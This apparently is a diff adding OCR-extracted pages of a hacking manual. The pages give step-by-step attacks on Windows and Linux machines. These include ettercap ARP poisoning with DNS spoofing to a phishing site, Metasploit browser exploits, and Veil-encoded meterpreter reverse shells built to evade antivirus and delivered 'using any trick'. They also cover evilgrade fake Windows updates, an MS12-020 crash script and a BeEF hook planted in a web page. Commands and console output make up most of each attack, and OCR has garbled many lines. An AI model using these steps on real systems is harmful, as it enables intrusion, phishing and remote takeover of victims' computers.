+    [-] Stager turned off direct download payload...
+
+    ```
+
+
+    +   - Edit the file etter.dns. Put the IP for your fishing website
+
+
+    Sample hosts for dns_spoof plugin
+
+    The format is (for A query):
+
+    www.myhostname.com A 168.11.22.33
+
+    www.google.com A 192.168.28.133
+
+    www.google.com A 192.168.28.133
+
+
+    for PTR query:
+
+    www.bar.com A 10.0.0.10
+
+
+    Write the command: - get the ettercat GUI. Put sniff and choose the interface
+    then choose unified
+
+    siffing. Then go to host list. Then go m m and choose arp poisoning, poison one
+    way. In plugins,
+
+    choose dns_spoof plugin. Then start sniffing.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_126_0.png)
+
+
+    ```
+
+    /usr/local/share/ettercat/etter.dns-
+
+    * ettercat 0.7.4.1
+
+    Start Targets Hosts View Filters Logging Plugins Help
+
+    Host List
+
+    IP Address MAC Address Description
+
+    192.168.28.1 00:50:56:00:08
+
+    192.168.28.28 00:50:56:FE:BE:BD
+
+    192.168.28.214 00:2C:29:12:30
+
+    192.168.28.254 00:50:56:FB:D9:F9
+
+    Delete Host Add to Target 1 Add to Target 2
+
+    GROUP 1 : ANY (all the hosts in the list)
+
+    GROUP 2 : ANY (all the hosts in the list)
+
+    Activating dns_spoof_plugin...
+
+    Starting unified...
+
+    ```
+
+
+    +   - When the client in the internal network to go www.google.com , he will go
+    to your fishing site. You will be in back
+
+    track set command a shell where you can write commands for the client computer.
+    Try the commands ifconfig.'
+  merge: -1
+  pgno: 126
+- img_proc: true
+  md: '```
+
+    GET /C0Kymeywd/C06gbbjixte1C5dpPLBXAXXp/RelwxvdTICofCAAMbdbI|A== HTTP/1.1"
+
+    192.168.28.214 - [26/Aug/2013:17:03:03] "GET /Bn913D1yph HTTP/1.1" 200 -
+
+    shell> help
+
+    ```'
+  merge: -1
+  pgno: 127
+- img_proc: true
+  md: '# f) Hack Windows by Browser Autopone
+
+
+    This module has three actions. The first (and the default) is WebServer which
+    uses a combination of client-side and server-side techniques to fingerprint clients
+    and then automatically exploit them. Next is Defanged which does only the fingerprinting
+    part. Lastly list simply prints the names of all exploit modules that would be
+    used by the WebServer action given the current MATCH and EXCLUDE options. Also
+    adds a ''list'' command which is the same as running without list.
+
+
+    +   - The hacker can make his computer a fake webserver and he can make it on
+    a website that can utilize the browser security holes to hack his computer. Any
+    client will visit the hacker website, it will apply the exploits for the browser.
+
+    - Start attack Search for browser_autopone. Put LHOST and SRHOST the IP of the
+    hacker machine, and SRport = 80, URI Path/
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_128_0.png)
+
+
+    +   - You can shorten the url using the website bily.com. When it will hack the
+    client , it will open the meterpreter session.
+
+
+    Note: The antivirus will detect the autopone and block the connection'
+  merge: -1
+  pgno: 128
+- img_proc: true
+  md: '# g) Client side attack: Hack Windows by firefox faded on
+
+
+    This exploit dynamically creates a xpi addon. The bootstrapped Firefox addon is
+    presented to the victim via a web page. The victim''s Firefox browser will pop
+    a dialog asking if they trust the addon. Once the user clicks ''install'', the
+    addon is installed and executes the payload with full user permissions. As of
+    Firefox, this will work without a restart the addon marked to be ''bootstrapped''
+    The addon will execute the payload after each firefox restart, an option can be
+    given to automatically uninstall the addon once the payload has been executed.
+
+
+    +   * The hacker can make his computer a fake webserver and he can make on a website
+    that has fake plugins. Any client will visit the hacker website, the firefox will
+    try to download the plugins and will download also java meterpreter reverse tcp.
+
+    * In the scenario, search firefox. Use the exploit/multi/browser/firefox_xpi_bootstrapped_addon.
+    Set the payload windows/meterpreter/reverse_tcp. Set the Lhost and Rhost the hacker
+    computer and the Lport any port the srvport to be suitable port.
+
+
+    ```
+
+    mf exploit/multi/browser/firefox_xpi_bootstrapped_addon
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+    var PAYLOAD => windows/meterpreter/reverse_tcp
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > set LHOST 192.168.20.204
+
+    LHOST => 192.168.20.204
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > set LPORT 6666
+
+    LPORT => 6666
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > set SRHOST 192.168.20.204
+
+    SRHOST => 192.168.20.204
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > set SRVPORT 80
+
+    SRPORT => 80
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > set URIPATH /
+
+    nURIPATH => /
+
+    mf exploit(firefox_xpi_bootstrapped_addon) > exploit -j
+
+    [+] Exploit running as background job.
+
+    [+] Started reverse handler on 192.168.20.204:6666
+
+    [+] Using URL: http://192.168.20.204:6666/
+
+    [+] Server started.
+
+    ```
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_129_0.png)'
+  merge: -1
+  pgno: 129
+- img_proc: true
+  md: '+   - To see the sessions we writes the command "sessions -I". To choose the
+    first session write "session -I l".
+
+
+    Note: The firefox will detect the unverified plugins and will not install it'
+  merge: -1
+  pgno: 130
+- img_proc: true
+  md: '# h) Client side attack: Hack Windows by encoding payloads to bypass antivirus
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_131_0.png)
+
+
+    +   * Download Veil-master tool
+
+
+    ```
+
+    # cd Veil-master
+
+    ```
+
+
+    Cd setup
+
+
+    ```
+
+    ./setup.sh
+
+    ```
+
+
+    Python veil.py
+
+
+    +   * Choose list
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_131_1.png)
+
+
+    +   * Choose the payload 9: Powershell/virtualalloc. Then generate the payload.
+    Choose msfvenom. Choose the windows/metpreter/reverse_tcp. Choose the name of
+    the hacker host the ip of the hacker machine 192.168.52.135. Choose any lport.
+    Choose the name of payload.'
+  merge: -1
+  pgno: 131
+- img_proc: true
+  md: '```
+
+    ?] Use msfvenom or supply customcode:
+
+    1 - msfvenom (default)
+
+    2 - Custom
+
+    ```
+
+
+    ```
+
+    >] Please enter the number of your choice: 1
+
+    [*] Press [enter] for help...
+
+    [*] Press [tab] to list available payloads
+
+    [*] Please enter metasploit payload: windows/meterpreter/reverse_tcp
+
+    [*] Enter value for ''LHOST'' for local IP: 192.168.28.225
+
+    [*] Enter value for ''LPORT'': 4444
+
+    [*] Enter extra msfvenom options in OPTION value:
+
+    ```
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_132_0.png)
+
+
+    ```
+
+    [+] Press [enter] for ''payload''
+
+    [>] Please enter the base name for output files: mahmoud
+
+    Language: powershell
+
+    Payload: VirtualAlloc
+
+    Shellcode: windows/meterpreter/reverse_tcp
+
+    Options: LHOST=192.168.28.225 LPORT=4444
+
+    Source File: /root/veil-master/output/source/mahmoud.bat
+
+    ```
+
+
+    ```
+
+    [!] Your payload files have been generated, don''t get caught!
+
+    [!] And don''t submit samples to any online scanner ;
+
+    ```
+
+
+    ```
+
+    [>] press any key to return to the main menu
+
+    ```
+
+
+    +   * Attach the payload with another program using any archive program such as
+    winrar. Then use the icon to change the icon . Ask the client to download the
+    file using any trick
+
+    * Operate the multi-handler msfcli to catch the client-
+
+
+    msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.52.135
+    lport=4444 E
+
+
+    ```
+
+    root@kali# msfcli multi/handler payloadwindows/meterpreter/reverse_tcp lhost=192.168.28.225
+    lport=4444 E
+
+    ```
+
+
+    +   * After the user open the program, the meterpreter session will open'
+  merge: -1
+  pgno: 132
+- img_proc: true
+  md: "# j Hack windows by fake software update\n\n![](img/91b4da451291288ee84ff207e23ccb97_133_0.png)\n\
+    \n+   - We will make you for updates and through the fake update we will download\
+    \ the payload windows interpreter reverse tcp which will do reverse connection\
+    \ with the hacker computer and through the meter session you can control the client\
+    \ computer.\n- Install Evilgrade. To get the modules type\n\n```\n# evilgrade\
+    \ root@bt:~ /isr-evilgrade\nFile Edit View Terminal Help\n[DEBUG] Loading module:\
+    \ modules/subbelt.pm\n[DEBUG] Loading module: modules/winscsp.pm\n[DEBUG] Loading\
+    \ module: modules/iskit.pm\n[DEBUG] Loading module: modules/panda_antirootkit.pm\n\
+    [DEBUG] Loading module: modules/flip4hmac.pm\n[DEBUG] Loading module: modules/dvsvite.pm\n\
+    [DEBUG] Loading module: modules/ghost.pm\n[DEBUG] Loading module: modules/guillotinecal.pm\n\
+    [DEBUG] Loading module: modules/freepip.pm\n[DEBUG] Loading module: modules/shell.pm\n\
+    [DEBUG] Loading module: modules/cygwin.pm\n[DEBUG] Loading module: modules/winupdate.pm\n\
+    [DEBUG] Loading module: modules/net.pm\n[DEBUG] Loading module: modules/oscm.pm\n\
+    [DEBUG] Loading module: modules/vbox.pm\n[DEBUG] Loading module: modules/winlogon.pm\n\
+    [DEBUG] Loading module: modules/altkeys.pm\n[DEBUG] Loading module: modules/atube.pm\n\
+    [DEBUG] Loading module: modules/osx.pm\n[DEBUG] Loading module: modules/photoscape.pm\n\
+    ```\n\n# configure winupdate\n\n# show options\n\n+   - Create the payloads in\
+    \ other command lines\n\n# msfpayload windows/meterpreter/reverse_tcp lhost=192.168.28.133\
+    \ lport=5555 x > /root/heday1.exe\n\n```\nroot@bt:~ \nFile Edit View Terminal\
+    \ Help\nroot@bt:~ msfpayload windows/meterpreter/reverse_tcp lhost=192.168.28.133\
+    \ lport=5555 -4444 x > /root/nahmoud.exe\n```\n\n+   - Return to evilgrade to\
+    \ tell it about the payload"
+  merge: -1
+  pgno: 133
+- img_proc: true
+  md: 'evilgrade(winupdate):set agent ''<<OUT>/root/mahmoud.exe<OUT>''
+
+    set agent, ''<<OUT>/root/mahmoud.exe<OUT>''
+
+    evilgrade(winupdate):
+
+
+    +   - Edit the file dterns
+
+
+    ```
+
+    # or for WINS query:
+
+    # workgroup WINDS 127.0.0.1
+
+    # PC\ WINDS 127.0.0.1
+
+
+    # NOTE: the wildhosted hosts can''t be used to poison the PTR req
+
+    # so if you want to reverse poison you to specify a g
+
+    # host. (look at the www.microsoft.com example)
+
+
+    ###########################
+
+    # microsoft sucks);
+
+    # redirect it to www.linux.org
+
+
+    netget-plus.sourceforge.com A 192.168.28:133
+
+    windowsupdate.microsoft.com A 192.168.28:133
+
+    update.microsoft.com A 192.168.28:133
+
+    www.microsoft.com A # Wildcards in PTR are not allowed
+
+    # no one out there we can have our domains...
+
+    ```
+
+
+    +   - Operate etcapercap in command line
+
+
+    ```
+
+    # aftercap -T -Q -M -P dns_spoof/192.168.52.2 // // ( ip of the machine gateway)
+
+    root@#:gatecap -T -Q -M -P dns spoof/192.168.28.7 //
+
+    ettercap 0.4.1 copyright 2001-2011 ALoR & NaGa
+
+    Listening on eth0... (Ethernet)
+
+    eduors
+
+    [23/08/23-08:06:23 192.168.28.133 255.255.255.0]
+
+    Priv:46 Invalid entry go.microsoft.com
+
+    28 plugins
+
+    40 protocol dissectors
+
+    55 ports monitored
+
+    7592 vendor fingerprint
+
+    1766 tcp 05 fingerprint
+
+    2183 known services
+
+    Randomizing 255 hosts for scanning...
+
+    Scanning the whole network for 255 hosts...>> 100.00
+
+    ```
+
+
+    +   - Operate the multihander
+
+
+    ```
+
+    #Msfeli multihander/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.28.133
+    Lport=4444 E
+
+    # Please wait we load the module,...
+
+    ```
+
+
+    +   - Go to evil grade and write start
+
+
+    Evilgrade > start'
+  merge: -1
+  pgno: 134
+- img_proc: true
+  md: '```
+
+    >upgrade(winupdate)>status
+
+    OBSERVER: (pid 2348) already running
+
+    OBSERVER: (pid 2349) already running
+
+    ```
+
+
+    +   - Test on the client. The client will do windows update. The client will windowsupdate.microsoft.com.
+    From interpreter you can control the client computer. The command run vnc can
+    do anything in the client computer.'
+  merge: -1
+  pgno: 135
+- img_proc: true
+  md: '# j Hack windows server 2008 with MS12-020
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_136_0.png)
+
+
+    +   - MS12 is exploit targets the RPC service that is responsible for the remote
+    connection.
+
+    - You can use rdexpy.script in the cd to crash the server
+
+
+    ```
+
+    root@bt:~# python rdexpy.py 192.168.1.20/24
+
+    ```
+
+
+    +   - To discover the network
+
+
+    netdiscover -r 192.168.1.20/24
+
+    nmap -sV -O (IP address) to scan for services and see if the terminal service
+    is open (port 3389-msbt-server)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_136_1.png)
+
+
+    +   - You can use rdexpy.py script to crash the server'
+  merge: -1
+  pgno: 136
+- img_proc: true
+  md: '```
+
+    root@local:~# python rdpex.py 192.168.28.226
+
+    ```'
+  merge: -1
+  pgno: 137
+- img_proc: true
+  md: '# k) Client side Attack: Hack windows by BeEF
+
+
+    BeEF is short for the Browser Exploitation Framework. It is a penetration testing
+    tool that focuses on the web browser.
+
+
+    Amid growing concerns about web-attacks against clients, including mobile clients,
+    BeEF allows the professional penetration tester to assess the actual security
+    posture of a target environment using client-side attack vectors. Unlike other
+    security frameworks, BeEF looks past the hardened network perimeter and client
+    system, and examines exploitability within the context of the one open door, the
+    web browser. BeEF will hook one or more web browsers and use them as beachheads
+    for launching directed command modules and further attacks against the system
+    from within the browser context.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_138_0.png)
+
+
+    +   - It is web application. When the client browse this website, the hacker can
+    apply java payloads on the client computer.
+
+    - Go and install BeEF from back track, go exploitation tools, social engineering
+    tools, BeEF XSS framework, BeEF
+
+    - After the installation, you will get the hook url and uri url
+
+
+    Hook url: http://127.0.0.1:3000/js
+
+
+    Uri url: http://127.0.0.1:3000/ui/panel
+
+
+    ```
+
+    [15:45:49] Hook URL: http://127.0.0.1:3000/hook.js
+
+    [15:45:49] UI URL: http://127.0.0.1:3000/ui/panel
+
+    [15:45:49] running on network interface 192.168.20.13
+
+    ```
+
+
+    +   - Use the username beef and password beef to enter the control panel'
+  merge: -1
+  pgno: 138
+- img_proc: true
+  md: "# Hooked Browsers\n\n![](img/91b4da451291288ee84ff207e23ccb97_139_0.png)\n\n\
+    BROWSER EXPLOITATION FRAMEWORK PROJECT\n\nOfficial website: http://beefproject.com/\n\
+    \n# Getting Started\n\nWelcome to BeEF!\nBefore being to fully explore the framework\
+    \ you will have to 'hook' a browser. To begin with you can point a browser towards\
+    \ the basic demo here, the advanced version here.\n\nAfter hooking a browser in\
+    \ the framework they will appear in the Hooked Browsers' panel on the left. Hooked\
+    \ browsers will appear either an online or offline state, depending on how recently\
+    \ they have used the framework.\n\nHooked Browsers\n\n+   - Change index.html\
+    \ in the path /var/www/index.html and restart apache\n\n```\n<html>\n<head>\n\
+    \  <title>loading...</title>\n  <script src=\"http://127.0.0.1:3000/hook.js\"\
+    ></script>\n</head>\n<body>\n  <h1>loading...</h1>\n</body>\n</html>\n```\n\n\
+    +   - We can redirect the browser to certain website\n\n![](img/91b4da451291288ee84ff207e23ccb97_139_1.png)\n\
+    \n+   - In the armitage, create the java_signed applet payload and put the SRVHost\
+    \ and lhost ip as the hacker computer ip. Take the link and paste it under redirect\
+    \ browser section in the beef application. When the client will enter the link\
+    \ the computer will be hacked"
+  merge: -1
+  pgno: 139
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_140_0.png)'
+  merge: -1
+  pgno: 140
+- img_proc: true
+  md: '# 1) Hack linux by payload
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_141_0.png)
+
+
+    +   * The linux has less number of holes than the windows, but linux can be hacked
+    with payloads.
+
+    * Got to use msf3 payload and write the command msfpayload linux. Then use the
+    command msfcli multi/handler to control the hacked machine when the client runs
+    the payload
+
+
+    ```
+
+    root@kali:~# cd /opt/metasploit/msf3
+
+    root@kali:/opt/metasploit/msf3 msfpayload Linux/x86/meterpreter/reverse_tcp LHOST=
+
+    >192.160.28.133 LPORT=4444 Ri /.msfencode -l elf -e x86/shikata_ga_nai >> eduors
+
+    [*] x80/shikata_ga_nai succeeded with size 77 (iteration=1)
+
+    root@kali:/opt/metasploit/msf3 msfcli multi/handler payload=linux/x86/meterpreter
+
+    /reverse tcp LHOST=192.160.28.133 LPORT=4444 E
+
+    ```
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_141_1.png)'
+  merge: -1
+  pgno: 141
+- img_proc: true
+  md: '# Table of Contents
+
+
+    +   Common Windows, Linux and Web Server Systems Hacking Techniques 1
+
+    1. Introduction 2
+
+    2. Part A: Setup Lab 3
+
+    2. Part B: Trojans and Backdoors and Viruses 5
+
+    4. Part C: System Hacking 39
+
+    5. Part D: Hacking Web Servers 73
+
+    6. Part E: Windows and Linux Hacking 115'
+  merge: -1
+  pgno: 142
